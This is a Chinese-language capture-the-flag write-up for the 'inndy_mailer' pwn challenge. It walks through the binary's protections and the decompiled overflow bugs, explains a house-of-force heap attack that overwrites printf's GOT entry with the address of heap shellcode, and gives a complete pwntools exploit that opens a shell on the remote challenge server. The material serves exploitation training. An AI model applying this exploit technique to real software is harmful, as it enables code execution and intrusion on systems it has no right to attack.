# inndy_mailer

这个题呀，一言难进，原来作过一个类似的，一个坑忘了，第二次还是跳了。作不出来，搜exp。

但有必要记录一下

32位，got可写，有可写可执行段，PIE打开，无canary，基本是保护全关了。
```bash
[*] '/buuctf/402_inndy_mailer/pwn'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      No PIE (0x8047000)
    RWX:      Has RWX segments
```

再看漏洞：

1. 对size没有限制，这个很危险
2. gets读入，也没有长度限制，但是会加\0
3. write输入只指定长度，遇0不会中断，恰好这个长度在title可以被覆盖

```c
int write_mail()
{
  int v0; // eax
  int result; // eax
  int v2; // [esp+Ch] [ebp-Ch]
 
  printf("Content Length: ");
  v0 = readint();         //对size没有限制
  v2 = new_mail(v0);
  printf("Title: ");
  gets((char *)(v2 + 4));  //读入用gets可溢出，但会带\0
  printf("Content: ");
  gets((char *)(v2 + 72));
  *(_DWORD *)v2 = root;
  result = v2;
  root = v2;
  return result;
}
 
int dump_mail()
{
  int v1; // [esp+8h] [ebp-10h]
  int v2; // [esp+Ch] [ebp-Ch]
 
  v1 = root;
  v2 = 1;
  while ( v1 )
  {
    printf("-- Mail %d:\n", v2);
    printf("Title: %s\n", (const char *)(v1 + 4));
    printf("Content: ");
    fwrite((const void *)(v1 + 72), 1u, *(_DWORD *)(v1 + 68), stdout);  //write输出
    printf("\n-- End mail %d\n", v2++);
    v1 = *(_DWORD *)v1;
  }
  return puts("-- No more mail!");
}
```


堆块的基本结构是：

1. ptr指向上一个块，形成单链表，在show的时候从root开始一个个从后住前显示
2. title:0x40 
3. size: 在title后可被覆盖
4. context

基本思路：

1. 由于没有free，用到前边的块就得转一圈再回来，所以要覆盖top_chunk让他成全1
2. 再建负数块建到got表。但这有个问题，got可写位置很小，pre_size,size,ptr,后边的title就会覆盖到printf，所以要先在堆里布下shellcode然后在覆盖printf时写入shellcode的地址

完整exp

```python
from pwn import *
 
local = 0
if local == 1:
    p = process('./pwn')
    libc_elf = ELF("/home/shi/libc6-i386_2.23-0ubuntu11.3/libc-2.23.so")
else:
    p = remote('node4.buuoj.cn', 29791) 
    libc_elf = ELF('../libc6-i386_2.23-0ubuntu10_amd64.so')
 
elf = ELF('./pwn')
context(arch='i386', log_level='debug')
 
menu = b'Action: '
def add(size, title, msg):
    p.sendlineafter(menu, b'1')
    p.sendlineafter(b'Content Length: ', str(size).encode())
    p.sendlineafter(b'Title: ', title)
    p.sendlineafter(b'Content: ', msg)
 
def show():
    p.sendlineafter(menu, b'2')
 
shellcode = asm(shellcraft.sh()).ljust(0x40, b'\x00') +p32(0x20)
add(8, shellcode, b'B'*0x8)
add(8, b'A'*0x40+p32(0x20), b'A'*0x8 + p32(0) + p32(0xffffffff))   #通过溢出覆盖长度到下一块的ptr 输出堆地址
show()
p.recvuntil(b'B'*8)
p.recv(8)
heap_addr = u32(p.recv(4)) - 8
top_chunk = heap_addr + 0xb8
off_got   = elf.got['printf'] - top_chunk
print('heap:', hex(heap_addr))
print('top:', hex(top_chunk))
 
add(off_got -0x50, b'AAAA', b'BBBB') # 0x804a000:top_chunk.pre_size 0x804a00c:got.printf
 
#gdb.attach(p, 'b*0x80486e9')
 
p.sendlineafter(menu, b'1')
p.sendlineafter(b'Content Length: ', str(0x1).encode())
p.sendlineafter(b'Title: ', p32(heap_addr + 0xc))  #got.printf-> shellcode
 
p.interactive()
```

这个方法叫：house_of_force  bcloud_bctf_2016,gyctf_2020_force都非常类似

这个坑就是，下下来的程序的RWX段在栈上，而远程在堆上，在栈上的话这个基本完不成。主要是got头部没有空间。另外两题也有这坑，忘了。
